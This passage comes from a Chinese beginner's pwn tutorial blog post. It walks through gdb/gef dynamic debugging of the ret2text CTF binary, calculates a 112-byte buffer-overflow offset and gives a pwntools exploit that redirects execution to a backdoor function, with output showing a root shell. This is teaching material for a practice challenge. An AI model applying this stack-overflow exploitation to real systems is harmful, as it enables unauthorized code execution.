href=\"#动态调试\" class=\"headerlink\" title=\"动态调试\"></a>动态调试</h4><p>​\t啥是动态调试呢? 静态分析是看源程序的汇编代码,程序是死的,动态调试就是让程序跑起来,在程序运行的时候,在某个节点断下来,查看程序的运行时状态,如栈的布局,寄存器等等,来寻找漏洞和探索利用方式,这里同样我们要用一些工具,首先是gdb,gdb本身不是为了漏洞利用而生的,而是给程序员来调试程序用的.</p>\n<p>​\t(这里还需要安装一个插件, gef ,具体安装可以google,有很多安装教程,或者直接看github仓库)   不过,为啥要安插件呢? 因为没插件不好用,插件能够帮你提取重要信息,以及给你增加很多方便漏洞调试的命令.</p>\n<p>​\t我们用 gdb 文件名 来启动调试</p>\n<p>​\tstart 从第一条指令开始运行<img src=\"/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20221011173542682.png\" alt=\"image-20221011173542682\"></p>\n<p>​\tni 一步一步往下执行(遇到函数时不进入,直接执行完)</p>\n<p>这里我们执行到了gets函数,它就是用来读取我们用户输入的,我们先来随便输入一串a</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20221011173723873.png\" alt=\"image-20221011173723873\" style=\"zoom:50%;\">\n\n\n\n<p>telescope 查看栈的情况  连续按回车可以一直往下展示栈(其实是重复当前命令)</p>\n<p>能够看到 esp提示你 0xffffd56c这个位置存储的是这一串a,往下看,确实是,</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20221011173849858.png\" alt=\"image-20221011173849858\" style=\"zoom:50%;\">\n\n<p>当我们继续往下看的时候,我们看到了ebp</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20221011173946237.png\" alt=\"image-20221011173946237\" style=\"zoom:50%;\">\n\n\n\n<p>根据我们上面对栈的理解,buf之后是ebp然后是返回地址 (实际上实际情况可能比这还要复杂,暂且这样)</p>\n<p>所以我们也可以从这里算覆盖地址,用ebp的地址 - 字符串开头,也就是buffer的地址, 就可以算出来要填充的字节数</p>\n<p>0xffffd5d8 - 0xffffd56c &#x3D; 108 这是到ebp的, 再加上ebp 4个字节,于是就是 112 字节, 然后就是返回地址了</p>\n<p>那么返回地址我们返回到哪呢? 我们刚才在静态分析的时候已经分析到了存在后门函数,地址是0x804863a,所以我们返回这个后门的地址就可以了!</p>\n<p><font color=\"red\">ctfwiki里解释的太粗了,为什么eax的位置就是字符串开始读取的位置呢????????? </font></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20230218154658066.png\" alt=\"image-20230218154658066\"></p>\n<h4 id=\"构造payload与exp\"><a href=\"#构造payload与exp\" class=\"headerlink\" title=\"构造payload与exp\"></a>构造payload与exp</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload =  <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">108</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">4</span>  + retaddress</span><br><span class=\"line\">// <span class=\"number\">108</span>是覆盖缓冲区,<span class=\"number\">4</span>是覆盖ebp,然后就是返回地址了</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&quot;ret2text&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">retaddress = <span class=\"number\">0x804863a</span></span><br><span class=\"line\">payload = payload =  <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">108</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">4</span>  + p32(retaddress)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/zhan# python3 <span class=\"built_in\">exp</span>.py</span><br><span class=\"line\">[!] Could not find executable <span class=\"string\">&#x27;ret2text&#x27;</span> in $PATH, using <span class=\"string\">&#x27;./ret2text&#x27;</span> instead</span><br><span class=\"line\">[+] Starting local process <span class=\"string\">&#x27;./ret2text&#x27;</span>: pid <span class=\"number\">16542</span></span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">There is something amazing here, <span class=\"keyword\">do</span> you know anything?</span><br><span class=\"line\">$ id</span><br><span class=\"line\">Maybe I will tell you next time !$ whoami</span><br><span class=\"line\">root</span><br><span class=\"line\">$ ls</span><br><span class=\"line\"><span class=\"built_in\">exp</span>.py    ret2text  shellcode</span><br><span class=\"line\"> </span><br><span class=\"line\">于是我们就拿到权限了!</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"关于和pwntools的联动问题\"><a href=\"#关于和pwntools的联动问题\" class=\"headerlink\" title=\"关于和pwntools的联动问题\"></a>关于和pwntools的联动问题</h2><p>sh.send(payload)<br>pause()</p>\n<p>想达到在刚发送完这条payload,查看之后的效果,如果这样的话,是不行的,这样的话估计是执行了很多条之后的了,为什么呢?</p>\n<p>如果想达到上述效果,需要下断点. 先调试找到断点,然后在gdb.attach的时候下断点</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0xf7e4c624</span> &lt;gets+<span class=\"number\">292</span>&gt;    call   __uflow                    &lt;__uflow&gt;</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"number\">0xf7e4c629</span> &lt;gets+<span class=\"number\">297</span>&gt;    add    esp, <span class=\"number\">0x10</span></span><br></pre></td></tr></table></figure>\n\n<p>下断点下到0xf7e4c629就可以了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&quot;./ret2text&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(sh,<span class=\"string\">&quot;b *0xf7e4c624&quot;</span>)</span><br><span class=\"line\">retaddress = <span class=\"number\">0x804863a</span></span><br><span class=\"line\">payload = payload =  <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">108</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">4</span>  + p32(retaddress)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>运行的时候感觉不是到断点那里了,差了一些,但是可以一直往下n,还是差不多的</p>\n<p>需要输入的时候 切换到左边按一下回车,就发送过去了</p>\n",
            "tags": [
                "PWN入门"
            ]
        }
    ]
}